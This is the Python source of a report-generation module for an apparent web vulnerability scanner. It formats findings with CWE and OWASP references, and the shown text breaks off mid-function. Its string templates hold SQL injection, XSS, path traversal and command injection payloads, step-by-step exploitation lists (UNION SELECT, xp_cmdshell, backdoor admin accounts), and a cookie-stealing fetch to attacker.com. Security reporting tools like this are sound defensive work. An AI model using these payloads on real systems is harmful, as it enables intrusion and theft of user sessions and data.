"""
Report Generator Module
Generates comprehensive JSON and Markdown reports from all scan results
"""

import json
import os
from datetime import datetime
from urllib.parse import urlparse
import re


class ReportGenerator:
    def __init__(
        self,
        target_url,
        recon_results,
        passive_vulns,
        active_vulns,
        crawler_results=None,
        auth_results=None,
    ):
        self.target_url = target_url
        self.recon_results = recon_results
        self.passive_vulns = passive_vulns
        self.active_vulns = active_vulns
        self.crawler_results = crawler_results
        self.auth_results = auth_results
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.domain_name = self._extract_domain_name()

    def _extract_domain_name(self):
        """Extract and sanitize domain name from target URL - KEEP DOTS"""
        try:
            parsed = urlparse(self.target_url)
            domain = parsed.netloc or parsed.path
            # Remove port if present
            domain = domain.split(":")[0]
            # Only replace filesystem-unsafe characters (keep dots!)
            import re

            domain = re.sub(r"[^\w\-]", "_", domain)
            return domain.lower()
        except Exception:
            return "unknown_domain"

    def generate_all_reports(self):
        """Generate both JSON and Markdown reports"""
        os.makedirs("reports/json", exist_ok=True)
        os.makedirs("reports/markdown", exist_ok=True)

        json_path = self.generate_json_report()
        markdown_path = self.generate_markdown_report()

        return {"json_report": json_path, "markdown_report": markdown_path}

    def get_all_vulnerabilities(self):
        """Combine and sort all vulnerabilities"""
        all_vulns = []

        if "vulnerabilities" in self.passive_vulns:
            all_vulns.extend(self.passive_vulns["vulnerabilities"])

        if "vulnerabilities" in self.active_vulns:
            all_vulns.extend(self.active_vulns["vulnerabilities"])

        if self.auth_results and "vulnerabilities" in self.auth_results:
            all_vulns.extend(self.auth_results["vulnerabilities"])

        all_vulns.sort(key=lambda x: x.get("severity_score", 0), reverse=True)

        return all_vulns

    def get_severity_summary(self, vulnerabilities):
        """Calculate severity distribution"""
        summary = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}

        for vuln in vulnerabilities:
            severity = vuln["severity"]
            if severity in summary:
                summary[severity] += 1

        return summary

    def get_vulnerabilities_by_category(self, vulnerabilities):
        """Group vulnerabilities by category"""
        by_category = {}

        for vuln in vulnerabilities:
            category = vuln.get("category", "Other")
            if category not in by_category:
                by_category[category] = []
            by_category[category].append(vuln)

        return by_category

    def _calculate_cvss_score(self, severity):
        """Calculate CVSS score based on severity"""
        cvss_mapping = {
            "Critical": 9.5,
            "High": 7.5,
            "Medium": 5.0,
            "Low": 3.0,
            "Info": 0.0,
        }
        return cvss_mapping.get(severity, 0.0)

    def _get_cwe_id(self, category, title):
        """Get appropriate CWE ID based on vulnerability category and title"""
        cwe_mapping = {
            "Injection": {
                "SQL": "CWE-89",
                "Command": "CWE-77",
                "LDAP": "CWE-90",
                "XXE": "CWE-611",
                "default": "CWE-74",
            },
            "XSS": "CWE-79",
            "Security Headers": "CWE-693",
            "Cookie Security": "CWE-614",
            "TLS/SSL": "CWE-326",
            "Information Disclosure": "CWE-200",
            "HTTP Configuration": "CWE-16",
            "Path Traversal": "CWE-22",
            "CORS": "CWE-942",
            "Access Control": "CWE-284",
            "Authentication": "CWE-287",
            "Input Validation": "CWE-20",
            "Session Management": "CWE-384",
        }

        if category == "Injection":
            title_lower = title.lower()
            if "sql" in title_lower:
                return cwe_mapping["Injection"]["SQL"]
            elif "command" in title_lower:
                return cwe_mapping["Injection"]["Command"]
            elif "ldap" in title_lower:
                return cwe_mapping["Injection"]["LDAP"]
            elif "xxe" in title_lower:
                return cwe_mapping["Injection"]["XXE"]
            else:
                return cwe_mapping["Injection"]["default"]

        return cwe_mapping.get(category, "CWE-1000")

    def _get_cwe_url(self, cwe_id):
        """Get CWE reference URL"""
        cwe_number = cwe_id.replace("CWE-", "")
        return f"https://cwe.mitre.org/data/definitions/{cwe_number}.html"

    def _get_owasp_reference(self, category):
        """Get OWASP reference based on category"""
        owasp_mapping = {
            "Injection": "https://owasp.org/www-community/Injection_Flaws",
            "XSS": "https://owasp.org/www-community/attacks/xss/",
            "Security Headers": "https://owasp.org/www-project-secure-headers/",
            "TLS/SSL": "https://owasp.org/www-community/controls/Transport_Layer_Security_Cheat_Sheet",
            "CORS": "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny",
            "Authentication": "https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication",
            "Path Traversal": "https://owasp.org/www-community/attacks/Path_Traversal",
        }
        return owasp_mapping.get(category, "https://owasp.org/www-project-top-ten/")

    def _format_evidence(self, evidence):
        """Format evidence dictionary into readable markdown"""
        if not evidence or not isinstance(evidence, dict):
            return ""

        md = []
        md.append("**📋 Evidence Details:**\n")

        # Payload Information
        if "payload" in evidence:
            md.append(f"**Payload Used:**")
            md.append("```")
            md.append(str(evidence["payload"]))
            md.append("```\n")

        # HTTP Request
        if "request" in evidence:
            md.append("**HTTP Request:**")
            md.append("```http")
            md.append(evidence["request"])
            md.append("```\n")

        # HTTP Response
        if "response" in evidence:
            md.append("**HTTP Response:**")
            md.append("```http")
            response_text = str(evidence["response"])
            # Truncate if too long
            if len(response_text) > 1000:
                response_text = response_text[:1000] + "\n... (truncated)"
            md.append(response_text)
            md.append("```\n")

        # Pattern Matched
        if "matched_pattern" in evidence:
            md.append(f"**Pattern Matched:** `{evidence['matched_pattern']}`\n")

        # JWT Specific Evidence
        if "token_preview" in evidence:
            md.append(f"**Token Preview:** `{evidence['token_preview']}`")
        if "location" in evidence:
            md.append(f"**Token Location:** {evidence['location']}")
        if "decoded_header" in evidence:
            md.append("**Decoded JWT Header:**")
            md.append("```json")
            md.append(evidence["decoded_header"])
            md.append("```")
        if "decoded_payload" in evidence:
            md.append("**Decoded JWT Payload:**")
            md.append("```json")
            md.append(evidence["decoded_payload"])
            md.append("```")
        if "algorithm" in evidence:
            md.append(f"**Algorithm:** `{evidence['algorithm']}`")
        if "modified_token" in evidence:
            md.append(f"**Modified Token:** `{evidence['modified_token']}`")
        if "modified_algorithm" in evidence:
            md.append(f"**Modified Algorithm:** `{evidence['modified_algorithm']}`")
        if "test_result" in evidence:
            md.append(f"**Test Result:** {evidence['test_result']}")

        # Session/Cookie Evidence
        if "cookie_name" in evidence:
            md.append(f"**Cookie Name:** `{evidence['cookie_name']}`")
        if "cookie_value" in evidence:
            md.append(f"**Cookie Value:** `{evidence['cookie_value']}`")
        if "token_length" in evidence:
            md.append(f"**Token Length:** {evidence['token_length']} characters")
        if "minimum_recommended" in evidence:
            md.append(
                f"**Minimum Recommended:** {evidence['minimum_recommended']} characters"
            )
        if "pattern" in evidence:
            md.append(f"**Pattern Detected:** {evidence['pattern']}")

        # Status Codes and Headers
        if "status_code" in evidence or "response_status" in evidence:
            status = evidence.get("status_code") or evidence.get("response_status")
            md.append(f"**Response Status:** {status}")
        if "response_headers" in evidence:
            md.append("**Response Headers:**")
            md.append("```")
            for k, v in evidence["response_headers"].items():
                md.append(f"{k}: {v}")
            md.append("```")

        # File/URL Information
        if "exposed_file" in evidence:
            md.append(f"**Exposed File:** `{evidence['exposed_file']}`")
        if "full_url" in evidence:
            md.append(f"**Full URL:** `{evidence['full_url']}`")
        if "affected_url" in evidence:
            md.append(f"**Affected URL:** `{evidence['affected_url']}`")

        # Additional Context
        if "issue" in evidence:
            md.append(f"**Issue:** {evidence['issue']}")
        if "warning" in evidence:
            md.append(f"**⚠️ Warning:** {evidence['warning']}")
        if "vulnerability" in evidence:
            md.append(f"**Vulnerability Type:** {evidence['vulnerability']}")

        # Enumeration Evidence
        if "test_email_1" in evidence:
            md.append("\n**User Enumeration Test:**")
            md.append(
                f"- Test Email 1: `{evidence['test_email_1']}` → Status: {evidence.get('response_1_status')} (Length: {evidence.get('response_1_length')} chars)"
            )
            md.append(
                f"- Test Email 2: `{evidence['test_email_2']}` → Status: {evidence.get('response_2_status')} (Length: {evidence.get('response_2_length')} chars)"
            )
            if "difference" in evidence:
                md.append(f"- **Finding:** {evidence['difference']}")

        # Auth Bypass Evidence
        if "bypass_successful" in evidence:
            md.append(
                f"\n**🚨 Bypass Status:** {'✅ SUCCESSFUL' if evidence['bypass_successful'] else '❌ FAILED'}"
            )
        if "cookies_received" in evidence:
            md.append("**Cookies Received:**")
            md.append("```")
            for k, v in evidence["cookies_received"].items():
                md.append(f"{k}: {v}")
            md.append("```")

        md.append("")
        return "\n".join(md)

    def _generate_technical_details(self, vuln):
        """Generate technical details based on vulnerability type with evidence"""
        category = vuln.get("category", "")
        title = vuln.get("title", "").lower()
        evidence = vuln.get("evidence", {})

        # Base technical explanations
        technical_details = {
            "Injection": "This vulnerability occurs when untrusted data is sent to an interpreter as part of a command or query. "
            "The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data "
            "without proper authorization. This happens because the application fails to properly validate, sanitize, or "
            "escape user-supplied input before using it in backend operations.",
            "XSS": "Cross-Site Scripting allows attackers to inject malicious scripts into web pages viewed by other users. "
            "This occurs when the application includes untrusted data in a web page without proper validation or escaping. "
            "The malicious script executes in the victim's browser context, allowing the attacker to steal session tokens, "
            "redirect users to malicious sites, or modify page content.",
            "Security Headers": "Security headers are HTTP response headers that instruct browsers to enable security features. "
            "Missing headers leave the application vulnerable to various attacks. Modern browsers implement these "
            "security mechanisms, but they must be explicitly enabled via headers. Without them, the browser applies "
            "default (often less secure) behavior.",
            "Cookie Security": "Insecure cookie configuration allows attackers to intercept or manipulate session tokens and authentication "
            "credentials. Cookies without proper flags can be stolen via XSS attacks (missing HttpOnly), transmitted over "
            "unencrypted connections (missing Secure), or used in CSRF attacks (missing SameSite).",
            "TLS/SSL": "Weak TLS/SSL configuration exposes encrypted communications to interception and manipulation. Outdated protocols "
            "and weak cipher suites contain known cryptographic vulnerabilities that allow attackers to decrypt supposedly secure "
            "traffic. This can expose sensitive data including passwords, session tokens, and personal information.",
            "Path Traversal": "Path traversal vulnerabilities allow attackers to access files and directories outside the intended directory. "
            "This occurs when the application uses user input to construct file paths without proper validation. Attackers "
            "use special character sequences (../) to navigate the file system and access sensitive files like /etc/passwd "
            "or configuration files containing credentials.",
            "CORS": "Misconfigured Cross-Origin Resource Sharing (CORS) policies allow malicious websites to make authenticated requests "
            "to your application on behalf of legitimate users. This happens when the application reflects arbitrary origins in "
            "the Access-Control-Allow-Origin header or uses wildcard (*) with credentials, bypassing the Same-Origin Policy.",
            "Information Disclosure": "Information disclosure occurs when the application reveals sensitive technical details about its "
            "infrastructure, versions, or internal logic. This information aids attackers in planning targeted "
            "attacks by identifying specific vulnerabilities in known software versions or revealing system architecture.",
            "Authentication": "Authentication vulnerabilities allow attackers to bypass login mechanisms, impersonate users, or gain "
            "unauthorized access to protected resources. These flaws can result from weak session management, predictable tokens, "
            "SQL injection in login forms, or accepting insecure authentication tokens.",
            "Session Management": "Session management vulnerabilities enable attackers to hijack user sessions, fixate session IDs, or "
            "predict session tokens. Weak session handling can lead to unauthorized access, privilege escalation, and complete "
            "account takeover.",
        }

        base_explanation = technical_details.get(
            category,
            "This vulnerability represents a security weakness that could be exploited by attackers to compromise "
            "the application's security, integrity, or availability. The specific technical mechanism depends on "
            "the implementation details and attack vector described in this finding.",
        )

        # If evidence exists, enhance explanation with actual findings
        if evidence:
            enhanced_details = [
                base_explanation,
                "\n**Specific Findings from Testing:**\n",
            ]

            # JWT vulnerabilities
            if "algorithm" in evidence:
                enhanced_details.append(
                    f"- JWT token uses `{evidence['algorithm']}` algorithm"
                )
                if evidence.get("algorithm") == "none":
                    enhanced_details.append(
                        "- **CRITICAL:** The 'none' algorithm means the token has NO signature verification"
                    )
                    enhanced_details.append(
                        "- Attackers can forge arbitrary tokens by simply base64-encoding header and payload"
                    )

            if "decoded_payload" in evidence:
                enhanced_details.append(
                    "- JWT payload was successfully decoded (JWT payloads are NOT encrypted)"
                )
                if "sensitive_fields_found" in evidence:
                    enhanced_details.append(
                        f"- Sensitive data exposed in cleartext: {', '.join(evidence['sensitive_fields_found'])}"
                    )

            if "modified_token" in evidence and evidence.get("test_result"):
                enhanced_details.append(f"- **EXPLOITED:** {evidence['test_result']}")
                enhanced_details.append(
                    "- Server does not validate JWT signature properly"
                )

            # Session vulnerabilities
            if "token_length" in evidence:
                enhanced_details.append(
                    f"- Session token length: {evidence['token_length']} characters"
                )
                if evidence.get("minimum_recommended"):
                    enhanced_details.append(
                        f"- Minimum recommended: {evidence['minimum_recommended']} characters"
                    )
                    enhanced_details.append(
                        f"- **Exploitability:** With only {evidence['token_length']} characters, brute force attacks are feasible"
                    )

            if "pattern" in evidence:
                enhanced_details.append(
                    f"- Token pattern detected: {evidence['pattern']}"
                )
                enhanced_details.append(
                    "- Predictable tokens can be guessed or calculated by attackers"
                )

            # Injection vulnerabilities
            if (
                "matched_pattern" in evidence
                and "sql" in evidence["matched_pattern"].lower()
            ):
                enhanced_details.append(
                    f"- Database error detected: `{evidence['matched_pattern']}`"
                )
                enhanced_details.append(
                    "- Error messages confirm SQL injection vulnerability"
                )
                enhanced_details.append(
                    "- Attackers can extract entire database contents using this flaw"
                )

            # XSS vulnerabilities
            if "payload" in evidence and any(
                x in str(evidence["payload"]).lower()
                for x in ["<script", "onerror", "onload"]
            ):
                enhanced_details.append(
                    f"- Malicious payload reflected in response without sanitization"
                )
                enhanced_details.append(
                    "- JavaScript can execute in victim's browser context"
                )

            # Path Traversal
            if (
                "matched_pattern" in evidence
                and "root:" in evidence["matched_pattern"].lower()
            ):
                enhanced_details.append(
                    "- Successfully retrieved system files (e.g., /etc/passwd)"
                )
                enhanced_details.append(
                    "- Attackers can read sensitive configuration files and credentials"
                )

            # Auth Bypass
            if "bypass_successful" in evidence and evidence["bypass_successful"]:
                enhanced_details.append(
                    "- **CRITICAL EXPLOIT CONFIRMED:** Authentication was bypassed"
                )
                enhanced_details.append(
                    f"- Payload used: `{evidence.get('payload_username')}`"
                )
                enhanced_details.append(
                    "- No authentication required to access protected resources"
                )

            # Cookie Security
            if "has_secure" in evidence:
                if not evidence["has_secure"]:
                    enhanced_details.append(
                        "- Cookie lacks 'Secure' flag → can be transmitted over HTTP"
                    )
                if not evidence.get("has_httponly"):
                    enhanced_details.append(
                        "- Cookie lacks 'HttpOnly' flag → accessible via JavaScript"
                    )
                if not evidence.get("has_samesite"):
                    enhanced_details.append(
                        "- Cookie lacks 'SameSite' flag → vulnerable to CSRF attacks"
                    )

            return "\n".join(enhanced_details)

        return base_explanation

    def _generate_poc(self, vuln):
        """Generate proof of concept based on vulnerability type with real evidence"""
        category = vuln.get("category", "")
        title = vuln.get("title", "").lower()
        evidence = vuln.get("evidence", {})

        # If evidence exists, use real data
        if evidence:
            poc_parts = []

            # Check for actual request/response evidence
            if "request" in evidence:
                poc_parts.append("**Actual HTTP Request Used:**")
                poc_parts.append("```http")
                poc_parts.append(evidence["request"])
                poc_parts.append("```\n")

            if "response" in evidence:
                poc_parts.append("**Actual HTTP Response Received:**")
                poc_parts.append("```http")
                response = str(evidence["response"])
                if len(response) > 800:
                    response = response[:800] + "\n... (truncated for brevity)"
                poc_parts.append(response)
                poc_parts.append("```\n")

            if "payload" in evidence:
                poc_parts.append("**Payload Details:**")
                poc_parts.append("```")
                poc_parts.append(str(evidence["payload"]))
                poc_parts.append("```\n")

            # JWT-specific PoC
            if "token_preview" in evidence:
                poc_parts.append("**JWT Token Exploitation:**")
                poc_parts.append(f"1. Original Token: `{evidence['token_preview']}`")
                if "decoded_header" in evidence:
                    poc_parts.append("2. Decoded Header:")
                    poc_parts.append("```json")
                    poc_parts.append(evidence["decoded_header"])
                    poc_parts.append("```")
                if "modified_token" in evidence:
                    poc_parts.append(
                        f"3. Modified Token (with `{evidence.get('modified_algorithm')}` algorithm): `{evidence['modified_token']}`"
                    )
                    poc_parts.append(
                        "4. Server accepted the modified token without signature verification!"
                    )

            # Session Fixation PoC
            if "injected_session_id" in evidence:
                poc_parts.append("**Session Fixation Exploit:**")
                poc_parts.append(
                    f"1. Attacker sets victim's session ID to: `{evidence['injected_session_id']}`"
                )
                poc_parts.append(f"2. Victim logs in with this session ID")
                poc_parts.append(
                    f"3. Attacker uses the same session ID to hijack the authenticated session"
                )

            # Auth Bypass PoC
            if "payload_username" in evidence and "bypass_successful" in evidence:
                poc_parts.append("**Authentication Bypass Exploit:**")
                poc_parts.append("```http")
                poc_parts.append("POST /login HTTP/1.1")
                poc_parts.append(f"Host: {urlparse(self.target_url).netloc}")
                poc_parts.append("Content-Type: application/x-www-form-urlencoded")
                poc_parts.append("")
                poc_parts.append(
                    f"username={evidence['payload_username']}&password={evidence.get('payload_password', '')}"
                )
                poc_parts.append("```")
                if evidence["bypass_successful"]:
                    poc_parts.append(
                        "\n**Result:** ✅ Authentication bypassed successfully!"
                    )

            if poc_parts:
                return "\n".join(poc_parts)

        # Fallback to generic PoC templates
        if "sql" in title:
            return (
                "```http\nGET /page?id=1' OR '1'='1'-- HTTP/1.1\nHost: target.com\n\n"
                "Expected: Database error or unexpected behavior indicating SQL injection\n```"
            )
        elif category == "XSS":
            return (
                "```html\nPayload: <script>alert('XSS')</script>\n"
                "Test URL: /search?q=<script>alert('XSS')</script>\n\n"
                "Expected: Script execution in browser or reflection in response\n```"
            )
        elif "path traversal" in title:
            return (
                "```http\nGET /page?file=../../../../etc/passwd HTTP/1.1\nHost: target.com\n\n"
                "Expected: Contents of /etc/passwd file in response\n```"
            )
        elif "command" in title:
            return (
                "```http\nGET /page?cmd=; ls -la HTTP/1.1\nHost: target.com\n\n"
                "Expected: Directory listing or command output in response\n```"
            )
        else:
            return f"Test the vulnerability by accessing the affected URL with the payloads described in the technical details section."

    def _generate_impact_analysis(self, vuln):
        """Generate enhanced impact analysis with real-world scenarios"""
        severity = vuln.get("severity", "")
        category = vuln.get("category", "")
        title = vuln.get("title", "").lower()
        evidence = vuln.get("evidence", {})

        # Category-specific impact scenarios
        category_impacts = {
            "Injection": {
                "scenarios": [
                    "**Data Breach Scenario:** Attacker extracts entire customer database including passwords, credit cards, and PII",
                    "**Account Takeover:** Bypass authentication to gain admin access without credentials",
                    "**Data Manipulation:** Modify or delete critical database records (prices, orders, user accounts)",
                    "**Lateral Movement:** Use database privileges to execute OS commands and pivot to internal systems",
                ],
                "exploitability": [
                    "1. Identify injectable parameter (form field, URL parameter, header)",
                    "2. Test with single quote (') to trigger SQL error",
                    "3. Use UNION SELECT to extract data from other tables",
                    "4. Enumerate database schema with information_schema queries",
                    "5. Extract admin credentials and login to backend systems",
                    "6. Optionally: Use xp_cmdshell (MSSQL) or sys_exec (MySQL) for OS command execution",
                ],
            },
            "XSS": {
                "scenarios": [
                    "**Session Hijacking:** Steal session cookies and impersonate logged-in users",
                    "**Phishing Attack:** Inject fake login forms to harvest credentials",
                    "**Malware Distribution:** Redirect users to drive-by download sites",
                    "**Defacement:** Modify page content to display malicious or embarrassing content",
                    "**Keylogging:** Capture all keystrokes including passwords and sensitive data",
                ],
                "exploitability": [
                    "1. Find reflection point where user input appears in HTML",
                    "2. Inject <script>alert(1)</script> to confirm XSS",
                    "3. Craft payload to steal cookies: <script>fetch('https://attacker.com?c='+document.cookie)</script>",
                    "4. Send malicious link to victims via email/social media",
                    "5. Victim clicks link and their session is hijacked",
                    "6. Attacker uses stolen session to access victim's account",
                ],
            },
            "Authentication": {
                "scenarios": [
                    "**Complete Account Takeover:** Access any user account without knowing password",
                    "**Admin Panel Access:** Bypass authentication to reach administrative functions",
                    "**Data Exfiltration:** Access all user data, orders, payment information",
                    "**Privilege Escalation:** Escalate from regular user to administrator",
                    "**Persistent Backdoor:** Create rogue admin accounts for future access",
                ],
                "exploitability": [
                    "1. Identify login endpoint or authentication mechanism",
                    "2. Test for SQL injection: username: admin' OR '1'='1'--",
                    "3. If JWT: decode token, modify claims, re-encode without signature",
                    "4. If session-based: predict or brute-force session IDs",
                    "5. Bypass authentication and access protected resources",
                    "6. Create backdoor admin account for persistent access",
                ],
            },
            "Session Management": {
                "scenarios": [
                    "**Session Hijacking:** Steal active user sessions to impersonate users",
                    "**Session Fixation:** Force victim to use attacker-controlled session ID",
                    "**Account Takeover:** Predict session tokens to access any user account",
                    "**Privilege Escalation:** Hijack admin session for full system access",
                ],
                "exploitability": [
                    "1. Capture legitimate session token (via XSS, network sniffing, or prediction)",
                    "2. Analyze token structure and entropy",
                    "3. If predictable: calculate next/previous session IDs",
                    "4. If fixation possible: set victim's session ID before they login",
                    "5. Use stolen/predicted session to impersonate victim",
                    "6. Perform actions as the victim user",
                ],
            },
            "Path Traversal": {
                "scenarios": [
                    "**System File Access:** Read /etc/passwd, /etc/shadow, database config files",
                    "**Source Code Disclosure:** Access application source code to find more vulnerabilities",
                    "**Credential Theft:** Read configuration files containing API keys, database passwords",
                    "**Private Key Exposure:** Access SSH keys, SSL certificates, encryption keys",
                ],
                "exploitability": [
                    "1. Identify parameter that accepts file paths",
                    "2. Test with ../ sequences: ../../../../etc/passwd",
                    "3. Try URL encoding: ..%2F..%2F..%2Fetc%2Fpasswd",
                    "4. Access sensitive files and extract credentials",
                    "5. Use exposed credentials to access backend systems",
                    "6. Escalate to remote code execution if possible",
                ],
            },
            "CORS": {
                "scenarios": [
                    "**Data Theft from Other Origins:** Malicious site steals user data via cross-origin requests",
                    "**Account Actions:** Perform state-changing actions on behalf of victims",
                    "**API Exploitation:** Access private API endpoints from attacker-controlled domain",
                    "**Token Theft:** Steal authentication tokens via cross-origin requests",
                ],
                "exploitability": [
                    "1. Attacker hosts malicious website",
                    "2. Victim visits attacker's site while logged into target application",
                    "3. Malicious JavaScript makes cross-origin request to target",
                    "4. CORS misconfiguration allows request with credentials",
                    "5. Response containing sensitive data is sent to attacker's site",
                    "6. Attacker extracts user data, tokens, or performs actions",
                ],
            },
        }

        # Get category-specific impacts
        category_data = category_impacts.get(category, None)

        # Build impact analysis
        impact_lines = []

        # Add severity-based general impacts
        severity_impacts = {
            "Critical": [
                "**Immediate Risk:** This vulnerability can be exploited remotely without authentication",
                "**Data Breach:** Potential for complete data exfiltration or database compromise",
                "**System Compromise:** Attackers may gain unauthorized access to backend systems",
                "**Business Impact:** Could result in regulatory fines, legal liability, and reputational damage",
            ],
            "High": [
                "**Security Bypass:** Attackers can circumvent security controls",
                "**Data Exposure:** Sensitive information may be accessed or stolen",
                "**Service Disruption:** Potential for denial of service or system instability",
                "**Compliance Risk:** May violate GDPR, PCI-DSS, HIPAA, or other regulations",
            ],
            "Medium": [
                "**Limited Access:** Attackers may gain limited unauthorized access",
                "**Information Leakage:** Technical details exposed may aid further attacks",
                "**Indirect Risk:** Could be chained with other vulnerabilities",
                "**Best Practice:** Violates security standards and industry guidelines",
            ],
            "Low": [
                "**Minor Information Disclosure:** Limited technical information exposed",
                "**Defense in Depth:** Weakens overall security posture",
                "**Compliance:** May not meet security framework requirements",
                "**Best Practice:** Should be addressed as part of security hardening",
            ],
        }

        impact_lines.extend(
            [
                f"- {imp}"
                for imp in severity_impacts.get(severity, severity_impacts["Medium"])
            ]
        )

        # Add category-specific real-world scenarios
        if category_data:
            impact_lines.append("\n**Real-World Attack Scenarios:**")
            impact_lines.extend(
                [f"- {scenario}" for scenario in category_data["scenarios"]]
            )

            impact_lines.append("\n**Step-by-Step Exploitation:**")
            impact_lines.extend([f"{step}" for step in category_data["exploitability"]])

        # Add evidence-based specific impacts
        if evidence:
            impact_lines.append("\n**Specific Impact Based on Testing:**")

            # JWT impacts
            if "algorithm" in evidence and evidence["algorithm"] == "none":
                impact_lines.append(
                    "- ⚠️ **CRITICAL:** Any attacker can forge valid tokens for any user"
                )
                impact_lines.append(
                    "- No authentication or authorization can be trusted"
                )
                impact_lines.append(
                    "- Instant admin access by crafting token with admin role"
                )

            if "sensitive_fields_found" in evidence:
                impact_lines.append(
                    f"- **Data Exposed in JWT:** {', '.join(evidence['sensitive_fields_found'])}"
                )
                impact_lines.append(
                    "- This data is visible to anyone who intercepts the token"
                )
                impact_lines.append(
                    "- No encryption - just base64 encoding which is trivially decoded"
                )

            # Session impacts
            if "token_length" in evidence and evidence["token_length"] < 16:
                import math

                possibilities = 16 ** evidence["token_length"]  # Assuming hex
                impact_lines.append(
                    f"- **Brute Force Feasibility:** Only {possibilities:,} possible tokens"
                )
                impact_lines.append(
                    f"- With 1000 attempts/second: crackable in {possibilities/1000/3600:.1f} hours"
                )

            if "pattern" in evidence and "sequential" in evidence["pattern"].lower():
                impact_lines.append(
                    "- **Predictable Tokens:** Attacker can calculate valid session IDs"
                )
                impact_lines.append(
                    "- No brute force needed - just increment session ID"
                )

            # Auth bypass impacts
            if "bypass_successful" in evidence and evidence["bypass_successful"]:
                impact_lines.append(
                    "- ⚠️ **CONFIRMED EXPLOIT:** Authentication completely bypassed in testing"
                )
                impact_lines.append(
                    "- Attacker needs no credentials to access protected resources"
                )
                impact_lines.append(
                    "- All user accounts and data immediately accessible"
                )

            # Injection impacts
            if (
                "matched_pattern" in evidence
                and "sql" in evidence.get("matched_pattern", "").lower()
            ):
                impact_lines.append(
                    "- **Database Access Confirmed:** SQL errors expose database structure"
                )
                impact_lines.append("- Attacker can read ALL database tables")
                impact_lines.append("- Potential for data modification and deletion")
                impact_lines.append(
                    "- May escalate to OS command execution via database functions"
                )

            # Path traversal impacts
            if (
                "matched_pattern" in evidence
                and "root:" in evidence.get("matched_pattern", "").lower()
            ):
                impact_lines.append(
                    "- **System File Access Confirmed:** Successfully read /etc/passwd"
                )
                impact_lines.append("- Attacker can access ANY file on the system")
                impact_lines.append(
                    "- Can read database credentials, API keys, private keys"
                )
                impact_lines.append("- May lead to complete server compromise")

            # Exposed files
            if "exposed_file" in evidence:
                impact_lines.append(
                    f"- **Sensitive File Exposed:** {evidence['exposed_file']}"
                )
                if "keywords_found" in evidence:
                    impact_lines.append(
                        f"- Contains sensitive keywords: {', '.join(evidence['keywords_found'])}"
                    )
                impact_lines.append(
                    "- May contain hardcoded credentials, API keys, or secrets"
                )

            # CORS impacts
            if "cors" in category.lower():
                if (
                    evidence.get("response_headers", {}).get(
                        "Access-Control-Allow-Origin"
                    )
                    == "*"
                ):
                    impact_lines.append(
                        "- **Wildcard Origin:** ANY website can make authenticated requests"
                    )
                    impact_lines.append(
                        "- Attacker creates malicious website to steal user data"
                    )
                    impact_lines.append(
                        "- Works even for logged-in users visiting attacker's site"
                    )

        return "\n".join(impact_lines)

    def generate_json_report(self):
        """Generate comprehensive JSON report"""
        all_vulns = self.get_all_vulnerabilities()
        severity_summary = self.get_severity_summary(all_vulns)
        vulns_by_category = self.get_vulnerabilities_by_category(all_vulns)

        # Enhance vulnerabilities with CVSS and CWE
        enhanced_vulns = []
        for vuln in all_vulns:
            enhanced = vuln.copy()
            enhanced["cvss_score"] = self._calculate_cvss_score(vuln["severity"])
            enhanced["cwe_id"] = self._get_cwe_id(
                vuln.get("category", ""), vuln.get("title", "")
            )
            enhanced_vulns.append(enhanced)

        report_data = {
            "scan_info": {
                "target": self.target_url,
                "domain": self.domain_name,
                "timestamp": datetime.now().isoformat(),
                "scan_duration": "N/A",
                "total_vulnerabilities": len(all_vulns),
            },
            "severity_summary": severity_summary,
            "vulnerabilities_by_category": {
                category: len(vulns) for category, vulns in vulns_by_category.items()
            },
            "attack_surface": self._build_attack_surface(),
            "reconnaissance": self.recon_results,
            "vulnerabilities": enhanced_vulns,
        }

        filename = f"{self.domain_name}_security_report_{self.timestamp}.json"
        filepath = os.path.join("reports", "json", filename)

        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)

        return os.path.join("json", filename)

    def _build_attack_surface(self):
        """Build attack surface summary"""
        if not self.crawler_results:
            return None

        return {
            "total_urls": self.crawler_results.get("total_urls", 0),
            "total_forms": self.crawler_results.get("total_forms", 0),
            "total_parameters": self.crawler_results.get("total_parameters", 0),
            "total_endpoints": self.crawler_results.get("total_endpoints", 0),
            "javascript_files": len(self.crawler_results.get("js_files", [])),
            "api_endpoints": len(self.crawler_results.get("api_endpoints", [])),
        }

    def generate_markdown_report(self):
        """Generate comprehensive Markdown report with enhanced technical details"""
        all_vulns = self.get_all_vulnerabilities()
        severity_summary = self.get_severity_summary(all_vulns)
        vulns_by_category = self.get_vulnerabilities_by_category(all_vulns)

        md = []

        # Header
        md.append("# 🔒 Web Security Assessment Report")
        md.append(f"\n---\n")

        # Executive Summary
        md.append("## 📊 Executive Summary\n")
        md.append(f"**Target URL:** `{self.target_url}`")
        md.append(f"**Domain:** `{self.domain_name}`")
        md.append(f"**Scan Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        md.append(f"**Report ID:** {self.timestamp}")
        md.append(f"**Total Security Issues:** {len(all_vulns)}\n")

        # Risk Level Assessment
        risk_level = self._calculate_risk_level(severity_summary)
        md.append(f"### Overall Risk Level: **{risk_level}**\n")

        # Risk Scoring Methodology
        md.append("### Risk Scoring Methodology\n")
        md.append(
            "This assessment uses the Common Vulnerability Scoring System (CVSS) v3.1 framework:"
        )
        md.append(
            "- **Critical (9.0-10.0):** Immediate action required - actively exploitable vulnerabilities"
        )
        md.append(
            "- **High (7.0-8.9):** Urgent attention needed - significant security impact"
        )
        md.append(
            "- **Medium (4.0-6.9):** Should be addressed - moderate security concern"
        )
        md.append("- **Low (0.1-3.9):** Minor issues - limited security impact")
        md.append(
            "- **Info (0.0):** Informational findings - no direct security impact\n"
        )

        # Severity Distribution
        md.append("### Severity Distribution\n")
        md.append("| Severity | Count | Percentage | CVSS Range |")
        md.append("|----------|-------|------------|------------|")
        total = len(all_vulns) if len(all_vulns) > 0 else 1
        severity_ranges = {
            "Critical": "9.0-10.0",
            "High": "7.0-8.9",
            "Medium": "4.0-6.9",
            "Low": "0.1-3.9",
            "Info": "0.0",
        }
        for severity in ["Critical", "High", "Medium", "Low", "Info"]:
            count = severity_summary[severity]
            percentage = (count / total * 100) if total > 0 else 0
            emoji = self._get_severity_emoji(severity)
            cvss_range = severity_ranges[severity]
            md.append(
